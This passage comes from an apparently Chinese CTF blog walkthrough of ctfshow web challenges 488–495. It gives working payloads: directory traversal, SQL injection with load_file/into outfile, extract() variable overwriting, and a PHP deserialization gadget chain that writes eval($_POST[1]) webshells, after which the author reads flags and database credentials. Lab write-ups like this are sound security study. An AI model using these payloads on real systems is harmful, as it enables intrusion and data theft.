src="https://oss.waynejoons.icu/picphoto/20250917194101303.png"></p><p>sql那里两个参数都被md5包裹了，不能用sql注入做了。继续往下分析，可以看到有个<code>templateUtil::render(&#39;error&#39;,array(&#39;username&#39;=&gt;$username))</code>，暂时不知道<code>templateUtil</code>类和<code>render</code>函数有何用处</p><p>同时看到上面<code>include</code>了两个php文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917194452692.png"></p><p>通过目录穿越读取这两个文件代码分析后，发现 <code>render_class.php</code> 有用，<code>db_class.php</code> 则是数据库的一些连接配置，暂时用不到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=../render/render_class</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250917194829916.png"></p><p>可以看到里面定义了<code>render</code>函数和<code>shade</code>函数，其中<code>render</code>函数我们重点关注以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$templateContent</code> 获取<code>templates/$template.php</code>页面返回的内容，然后<code>$cache</code>调用<code>shade</code>函数替换<code>$templateContent</code> 中的字符串，把<code>&#123;&#123;username&#125;&#125;</code>替换为传入的数组<code>key:value</code>中的value值，最后再调用<code>cache</code>类中的<code>create_cache</code>函数</p><p>上面可以看到包含了<code>cache_class.php</code>，我们继续看看<code>create_cache</code>函数有什么作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=../render/cache_class</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250917195914926.png"></p><p><code>create_cache</code>函数先检查是否存在文件<code>cache/md5($template).php</code>，如果没有则创建一个php文件，并把<code>$content</code>写进去，其中<code>$content</code>我们可以控制，且<code>$template</code>也是固定的，那就很简单了</p><p>利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templateUtil::render() -&gt; templateUtil::shade() -&gt; cache::create_cache() -&gt; fileUtil::write()</span><br></pre></td></tr></table></figure><p>我们看看<code>index</code>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id from user where username = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$username</span>).<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$user</code>不存在时就会进入else语句，然后传入<code>$template</code>为 error，数组为<code>[username: 任意内容]</code>。我们可以写个webshell进去，因为error的md5值为<code>cb5e100e5a9a3e7f6d1fd97512215282</code>，文件会上传到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache/cb5e100e5a9a3e7f6d1fd97512215282.php</span><br></pre></td></tr></table></figure><p>要注意如果已经查询过的话，会进入else分支，那么<code>cache/cb5e100e5a9a3e7f6d1fd97512215282.php</code>就已经存在了，后面再查询就会返回true，无法再进入<code>create_cache</code>函数的else分支，也就无法再写入webshell了，这种情况只能重开靶机，这一点要注意</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917201550550.png"></p><p>可以输入<code>/index.php?action=error</code>测试一下，访问<code>templates/error.php</code>，可以看到页面返回<code>&#123;&#123;username&#125;&#125;不存在</code>，正好符合条件，可以把<code>&#123;&#123;username&#125;&#125;</code>置换为我们传入的任意内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917203151855.png"></p><p>重开靶机，然后GET传入payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;password=123</span><br></pre></td></tr></table></figure><p>显示不存在即为成功</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917202346350.png"></p><p>然后蚁剑连接，路径为<code>cache/cb5e100e5a9a3e7f6d1fd97512215282.php</code>，要注意把https改成http</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917202610965.png"></p><p>在根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917202646186.png"></p><h3 id="web489"><a href="#web489" class="headerlink" title="web489"></a>web489</h3><p>继续看index代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=../index</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250917205447532.png"></p><p>可以看到else分支改了，不能上传内容到error那里了，但是题目给出了关键代码<code>extract($_GET)</code>，意思是将 <code>$_GET</code> 数组中的所有键值对转换成对应的普通变量，那我们可以通过变量覆盖来触发<code>templateUtil::render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username))</code>，效果跟上题一样</p><p>这次题目贴心给出了cache清除代码，如果你在登录框尝试登录过，那可以通过输入<code>/index.php?action=clear</code>来清除cache目录，这样就不用重启靶机了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法跟上题差不多，不过payload要改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=&lt;?php eval($_POST[1]);?&gt;&amp;sql=select 1;</span><br></pre></td></tr></table></figure><p>通过变量覆盖使if永真，然后读取的位置从error变成了index，其他一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917210829319.png"></p><p>在根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917210906532.png"></p><h3 id="web490"><a href="#web490" class="headerlink" title="web490"></a>web490</h3><p>先来看看index代码，方法跟之前一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917212938997.png"></p><p>我们关注重点以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$user</span>-&gt;username));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sql语句变了，<code>username</code>那里没有md5包裹了，然后<code>render(&#39;index&#39;,array(&#39;username&#39;=&gt;$username));</code>变成了<code>render(&#39;index&#39;,array(&#39;username&#39;=&gt;$user-&gt;username));</code></p><p>那好办，方法跟之前一样，只不过这次通过sql注入改变查询的<code>username</code>的值，使后面的<code>$user-&gt;username</code>能返回我们想要的值</p><p>但是一开始输入payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=1&#x27; union select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure><p>会发现莫名其妙返回了一个<code>?&gt;</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250917214115490.png"></p><p>查看<code>/cache/6a992d5529f459a44fee58c733255e86.php</code>，发现页面显示语法错误</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917214234576.png"></p><p>那估计大概率是字符串替换后本身就已经被php标签包裹了，所以多出来的<code>?&gt;</code>就显示在页面上了。后面发现<code>/index.php?action=index</code>可以看到传入后的代码，也验证了猜想</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917214937407.png"></p><p>那我们修改一下代码，先输入<code>/index.php?action=clear</code>清空缓存，再传入payload，后面的题目如果有输入过username这些，记得一定要先清空cache，不然内容写不进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=1&#x27; union select &#x27;eval($_POST[1])&#x27;--+&amp;password=1</span><br></pre></td></tr></table></figure><p>蚁剑连接，在根目录找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250917215317317.png"></p><h3 id="web491"><a href="#web491" class="headerlink" title="web491"></a>web491</h3><p>继续分析代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919103825597.png"></p><p>被修复了，不能用之前的方法写入webshell了，但是username那边没有md5包裹，可以用SQL注入获取flag</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=1&#x27; union select load_file(&#x27;/flag&#x27;) into outfile &quot;/tmp/3.php&quot; --+&amp;password=1</span><br></pre></td></tr></table></figure><p>然后目录穿越读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919104400983.png"></p><h3 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919110723087.png"></p><p>这个多了一个正则，然后上题的<code>templateUtil::render(&#39;index&#39;)</code>改回<code>templateUtil::render(&#39;index&#39;,$user)</code>，可以继续用之前的方法</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=check&amp;username=&#x27;1&amp;user[username]=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>大概思路就是利用<code>extract($_GET);</code>污染变量，然后username随便带个符号跳过正则验证直接来到<code>templateUtil::render(&#39;index&#39;,$user)</code>，后面的步骤跟之前一样，也是通过字符串替换写入webshell</p><p>然后蚁剑连接读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919111409023.png"></p><h3 id="web493"><a href="#web493" class="headerlink" title="web493"></a>web493</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919120315974.png"></p><p>因为下面的render只传入了<code>$template</code>，没有传入数组参数，所以不能走这条路。然后SQL那里又有正则限制，不能出现符号，所以也无法进行SQL注入，但是上面出现了关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>那我们可以用反序列化来做这题，读取上面的<code>render/db_class.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=../render/db_class</span><br></pre></td></tr></table></figure><p>得到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;addr,<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password,<span class="variable">$this</span>-&gt;database);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable">$this</span>-&gt;sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;log, <span class="variable">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构建反序列化payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/3.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content =<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">db</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>得到结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A2%3A%22db%22%3A2%3A%7Bs%3A3%3A%22log%22%3BO%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A9%3A%22log%2F3.php%22%3B%7Ds%3A3%3A%22sql%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>然后cookie写入payload，记得要满足<code>if(!isset($action))</code>，把action参数删去就可以</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919121223772.png"></p><p>然后蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919121337295.png"></p><h3 id="web494"><a href="#web494" class="headerlink" title="web494"></a>web494</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919134125792.png"></p><p>一开始看到<code>templateUtil::render(&#39;index&#39;,$user)</code>，我以为可以继续用之前的方法，但是后面连接webshell怎么都连不上，读取<code>/render/cache_class.php</code>代码之后发现php后缀改成html后缀了，那没办法了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919134412853.png"></p><p>反序列化那里加了<code>if(preg_match(&#39;/\:|\,/&#39;, $c))&#123;</code>来过滤，不过不影响，继续用上题的反序列化方法</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title function_ invoke__">dbLog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/3.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content =<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">db</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A2%3A%22db%22%3A2%3A%7Bs%3A3%3A%22log%22%3BO%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A9%3A%22log%2F3.php%22%3B%7Ds%3A3%3A%22sql%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>然后cookie传入，蚁剑连接webshell，找了一会找不到flag，那连接数据库看看，先读取<code>/render/db_class.php</code>查看数据库配置信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919135354414.png"></p><p>然后蚁剑连接</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919135423947.png"></p><p>读取flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250919135511152.png"></p><h3 id="web495"><a href="#web495" class="headerlink" title="web495"></a>web495</h3><p>核心代码没有变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ 